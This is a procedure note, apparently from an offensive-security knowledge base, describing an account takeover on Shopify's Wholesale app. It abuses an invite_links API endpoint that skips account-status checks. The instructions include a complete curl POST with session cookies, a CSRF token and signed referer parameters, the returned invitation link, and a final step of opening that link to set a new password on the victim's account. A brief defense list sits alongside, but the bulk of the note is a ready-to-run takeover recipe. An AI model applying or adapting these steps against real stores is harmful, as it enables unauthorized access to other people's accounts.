---
tags:
  - shopify
  - account-takeover
  - api-exploit
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/shopify-invite-links-post]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Manipulation]]'
updated_at: '2025-12-14T17:30:18.646Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 52d4c65c-9bb4-4ac5-ba97-f40281012cbc
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Account Manipulation]]'
---
# Generate-Invitation-Link-via-API

## Summary

This procedure sends a follow-up POST to the invite_links API endpoint immediately after send_invite, retrieving a functional invitation link for an active wholesale customer account, which allows password reset and takeover.

## Description

The /admin/shops/{shop_id}/accounts/{account_id}/invite_links endpoint, like send_invite, fails to validate active status, returning a 201 Created JSON with an invite_link URL containing a token. This link bypasses normal activation flows, enabling unauthorized reset. Requires X-Csrf-Token and XMLHttpRequest headers from the staff session.

## Requirements

1. Successful send_invite from prior procedure
2. Fresh X-Csrf-Token from session
3. Target account ID and shop ID
4. Burp Suite for request crafting

## Defense

Defensive measures and detection strategies:

- Add backend checks for account status in invite_links API
- Require elevated permissions for all invite-related API calls
- Alert on invite link generations for enabled accounts and monitor token usage

## Objectives

1. Obtain usable invitation link for enabled account
2. Enable subsequent password reset
3. Achieve persistence via account compromise

## Instructions

### Step 1: Prepare Follow-Up Request

**Context**: Extract CSRF token and ensure session cookies are current post-send_invite.

Inspect Burp history or dev tools for X-Csrf-Token (e.g., 8TESa0/8klTiTrM0zMpVyEmoGvady47gKvvExY9jFYuH3PoV0xQEwTuAeN8WHkq2Vb+DAhtaZ4YkTKKh5f5NXg==).

> Token valid for AJAX requests; body empty for this endpoint.

### Step 2: Send Invite Links Request

**Context**: Replay as POST with AJAX headers to generate the link.

Execute [[commands/shopify-invite-links-post]] via Burp or curl:

```bash
curl -X POST 'https://wholesale.shopifyapps.com/admin/shops/19596/accounts/5182518/invite_links' \
  -H 'Host: wholesale.shopifyapps.com' \
  -H 'Cookie: _y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _shopify_y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _ga=GA1.2.tHExgAAT11NXuhaT9YUE8g%253D%253D; _session_id=fc5f618342a1e6b09a1b0dd8f663c815; shopify_domain=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkluTmpjbWx3ZEMxemNtTXRhSFIwY0hNdGFIbGtjbUY0WVc1dmJpMTRjM010YUhRdGMyTnlhWEIwTG0xNWMyaHZjR2xtZVM1amIyMGkiLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5zaG9waWZ5X2RvbWFpbiJ9fQ%3D%3D--0638dd0f382c4106ac4bc036aef29aff573e7e4f; _gid=GA1.2.1173666896.1626524371; _s=b49fbdf4-ACD4-4EC3-2C95-5B9FC0AB0372; _shopify_s=b49fbdf4-ACD4-4EC3-2C95-5B9FC0AB0372; _gat=1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: https://wholesale.shopifyapps.com/admin/shops/19596/accounts/5182510?hmac=a916ff51bbbb7f51d6ac927131c0b28b08f54458a1062284fdbabd823d43c2f1&host=c2NyaXB0LXNyYy1odHRwcy1oeWRyYXhhbm9uLXhzcy1odC1zY3JpcHQubXlzaG9waWZ5LmNvbS9hZG1pbg&locale=en-US&session=6200a0935dc41a7c47776049d06e4b7f513d5b4622342e2851aeb5fc8f2f9f75&shop=script-src-https-hydraxanon-xss-ht-script.myshopify.com&timestamp=1626529537' \
  -H 'X-Csrf-Token: 8TESa0/8klTiTrM0zMpVyEmoGvady47gKvvExY9jFYuH3PoV0xQEwTuAeN8WHkq2Vb+DAhtaZ4YkTKKh5f5NXg==' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Origin: https://wholesale.shopifyapps.com' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Content-Length: 0' \
  -H 'Te: trailers' \
  -H 'Connection: close'
```

> Response: HTTP/2 201 Created JSON {"invite_link":"https://script-src-https-hydraxanon-xss-ht-script.wholesale.shopifyapps.com/accounts/invitation/accept?invitation_token=█████"}

### Step 3: Validate Link

**Context**: Test the link for functionality.

Open the invite_link in an incognito browser to confirm password reset flow.

> Successful access to reset form; set new password to takeover account.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]] Persistence

### Techniques

- [[Account Manipulation]] Account Manipulation

### Sub-Techniques


## Commands Used

- [[commands/shopify-invite-links-post]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- invite-link
- account-manipulation
- takeover
